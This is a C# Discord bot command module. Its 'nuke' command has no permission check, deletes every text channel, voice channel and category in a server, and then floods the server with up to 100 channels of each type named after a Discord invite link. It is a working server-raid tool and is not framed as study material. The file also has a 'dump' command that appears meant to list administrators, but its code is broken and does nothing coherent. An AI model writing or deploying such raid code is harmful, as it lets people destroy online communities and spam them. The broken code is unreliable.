using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;

namespace DiscordBotV1
{
    
    public class Commands : ModuleBase<SocketCommandContext>
    {
        [Command("nuke")]
        public async Task nuke(int amount = 100)
            {
                await Context.Message.DeleteAsync();
                if (amount <= 0) amount = 100;
                foreach (var Channel in Context.Guild.Channels)
                {
                    try
                    {
                        await Channel.DeleteAsync();
                    }
                    catch
                    {
                        Console.WriteLine("ERROR");
                    }
                }
                foreach (var VC in Context.Guild.VoiceChannels)
                {
                    try
                    {
                        await VC.DeleteAsync();
                    }
                    catch
                    {
                        Console.WriteLine("Error");
                    }
                }
                foreach (var Catagory in Context.Guild.CategoryChannels)
                {
                    try
                    {
                        await Catagory.DeleteAsync();

                    }
                    catch
                    {
                        Console.WriteLine("ERRROR");
                    }

                }

                for (int i = 0; i < amount; i++)
                {
                    try
                    {
                        await Context.Guild.CreateTextChannelAsync("https://discord.gg/xA3deqxVVH");
                        await Context.Guild.CreateVoiceChannelAsync("https://discord.gg/xA3deqxVVH");
                        await Context.Guild.CreateCategoryChannelAsync("https://discord.gg/xA3deqxVVH");

                    }
                    catch
                    {
                        Console.WriteLine("ERROR");
                    }

                }



            }
        [Command("ban")]
        [Summary("Bans a user from the server.")]
        [RequireUserPermission(GuildPermission.BanMembers)]
        [RequireBotPermission(GuildPermission.BanMembers)]
        public async Task BanAsync(IUser user, int pruneDays = 0, [Remainder] string reason = null)
        {
            if (user == null) await ReplyAsync("Please specify a user");
            else if (pruneDays == 0) await ReplyAsync("Please specify days to remove messages");
            else if (reason == null) await ReplyAsync("Please specify reason");
            else await Context.Guild.AddBanAsync(user, pruneDays, reason);
            await ReplyAsync("Banned" + user);
        }

        [Command("dump")]
        public async Task Dump()
        {
            var Admins = GuildPermission.Administrator;
            foreach (var users in Context.Guild.Users)
            {
                if (Context.Guild.Users is SocketGuild user)
                {
                    if (user.Roles.Equals(GuildPermission.Administrator)) user = Admins;
                }
                await ReplyAsync("Dumped:" + Admins);
            }
        }


        [Command("ping")]
        public async Task PingAsync()
        {
            await Context.Channel.SendMessageAsync("I am a dysfunctional bot that finally works");
        }
    }
}
